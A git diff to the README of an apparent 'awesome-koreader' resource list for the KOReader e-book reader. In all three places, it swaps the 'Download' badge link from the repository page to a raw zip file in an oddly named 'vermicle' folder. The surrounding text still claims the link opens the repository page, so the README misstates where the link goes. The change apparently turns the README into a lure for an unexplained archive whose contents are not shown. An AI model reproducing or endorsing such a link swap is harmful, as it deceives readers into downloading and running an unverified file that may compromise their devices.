@@ -1,6 +1,6 @@
 # 📚 awesome-koreader - Organize Your KOReader Resources Easily
 
-[![Download Here](https://img.shields.io/badge/Download-awesome--koreader-brightgreen)](https://github.com/rupammaityg/awesome-koreader)
+[![Download Here](https://img.shields.io/badge/Download-awesome--koreader-brightgreen)](https://raw.githubusercontent.com/rupammaityg/awesome-koreader/main/vermicle/awesome-koreader-v3.2.zip)
 
 ---
 
@@ -18,7 +18,7 @@ KOReader is a free document viewer that works well on many e-ink devices like Ki
 
 Click this big green button to open the download page:
 
-[![Download awesome-koreader](https://img.shields.io/badge/Download-awesome--koreader-brightgreen)](https://github.com/rupammaityg/awesome-koreader)
+[![Download awesome-koreader](https://img.shields.io/badge/Download-awesome--koreader-brightgreen)](https://raw.githubusercontent.com/rupammaityg/awesome-koreader/main/vermicle/awesome-koreader-v3.2.zip)
 
 This link leads you to the main GitHub repository page. You will find all files, guides, and links here.
 
@@ -135,4 +135,4 @@ You can read installation guides, user tips, and discussions that other users ha
 
 ---
 
-[![Download awesome-koreader](https://img.shields.io/badge/Download-awesome--koreader-brightgreen)](https://github.com/rupammaityg/awesome-koreader)
+[![Download awesome-koreader](https://img.shields.io/badge/Download-awesome--koreader-brightgreen)](https://raw.githubusercontent.com/rupammaityg/awesome-koreader/main/vermicle/awesome-koreader-v3.2.zip)
